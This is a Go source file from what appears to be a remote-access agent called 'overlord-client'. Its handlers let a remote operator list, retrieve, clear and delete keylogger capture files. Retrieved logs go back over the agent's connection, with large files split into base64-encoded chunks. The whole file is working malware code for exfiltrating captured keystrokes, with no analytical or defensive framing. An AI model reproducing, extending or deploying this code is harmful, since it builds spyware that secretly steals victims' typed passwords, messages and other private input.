package handlers

import (
	"context"
	"encoding/base64"
	"log"

	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

const MaxChunkSize = 256 * 1024

func HandleKeylogList(ctx context.Context, env *runtime.Env, cmdID string) error {
	if env.Keylogger == nil {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "command_result",
			"commandId": cmdID,
			"ok":        false,
			"message":   "Keylogger not initialized",
		})
	}

	env.Keylogger.FlushNow()

	files, err := env.Keylogger.ListFiles()
	if err != nil {
		log.Printf("[keylogger] list error: %v", err)
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "command_result",
			"commandId": cmdID,
			"ok":        false,
			"message":   err.Error(),
		})
	}

	fileInfos := make([]map[string]interface{}, len(files))
	for i, f := range files {
		fileInfos[i] = map[string]interface{}{
			"name": f.Name,
			"size": f.Size,
			"date": f.Date.Format("2006-01-02T15:04:05Z07:00"),
		}
	}

	return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
		"type":  "keylog_file_list",
		"files": fileInfos,
	})
}

func HandleKeylogRetrieve(ctx context.Context, env *runtime.Env, cmdID string, filename string) error {
	if env.Keylogger == nil {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "command_result",
			"commandId": cmdID,
			"ok":        false,
			"message":   "Keylogger not initialized",
		})
	}

	if filename == "" {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "command_result",
			"commandId": cmdID,
			"ok":        false,
			"message":   "Filename required",
		})
	}

	env.Keylogger.FlushNow()

	data, err := env.Keylogger.ReadFile(filename)
	if err != nil {
		log.Printf("[keylogger] read error: %v", err)
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "command_result",
			"commandId": cmdID,
			"ok":        false,
			"message":   err.Error(),
		})
	}

	if len(data) <= MaxChunkSize {
		content := string(data)
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":     "keylog_file_content",
			"filename": filename,
			"content":  content,
		})
	}

	totalChunks := (len(data) + MaxChunkSize - 1) / MaxChunkSize
	for i := 0; i < totalChunks; i++ {
		start := i * MaxChunkSize
		end := start + MaxChunkSize
		if end > len(data) {
			end = len(data)
		}

		chunk := data[start:end]
		isLast := i == totalChunks-1

		encoded := base64.StdEncoding.EncodeToString(chunk)

		if err := wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_file_chunk",
			"filename":  filename,
			"chunk":     i,
			"total":     totalChunks,
			"content":   encoded,
			"isLast":    isLast,
			"isEncoded": true,
		}); err != nil {
			log.Printf("[keylogger] send chunk error: %v", err)
			return err
		}

		if isLast {
			return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
				"type":     "keylog_file_content",
				"filename": filename,
				"content":  string(data),
			})
		}
	}

	return nil
}

func HandleKeylogClearAll(ctx context.Context, env *runtime.Env, cmdID string) error {
	if env.Keylogger == nil {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_clear_result",
			"commandId": cmdID,
			"ok":        false,
			"error":     "Keylogger not initialized",
		})
	}

	err := env.Keylogger.ClearAll()
	if err != nil {
		log.Printf("[keylogger] clear error: %v", err)
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_clear_result",
			"commandId": cmdID,
			"ok":        false,
			"error":     err.Error(),
		})
	}

	return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
		"type": "keylog_clear_result",
		"ok":   true,
	})
}

func HandleKeylogDelete(ctx context.Context, env *runtime.Env, cmdID string, filename string) error {
	if env.Keylogger == nil {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_delete_result",
			"commandId": cmdID,
			"ok":        false,
			"error":     "Keylogger not initialized",
		})
	}

	if filename == "" {
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_delete_result",
			"commandId": cmdID,
			"ok":        false,
			"error":     "Filename required",
		})
	}

	if err := env.Keylogger.DeleteFile(filename); err != nil {
		log.Printf("[keylogger] delete error: %v", err)
		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
			"type":      "keylog_delete_result",
			"commandId": cmdID,
			"ok":        false,
			"error":     err.Error(),
			"filename":  filename,
		})
	}

	return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
		"type":     "keylog_delete_result",
		"ok":       true,
		"filename": filename,
	})
}
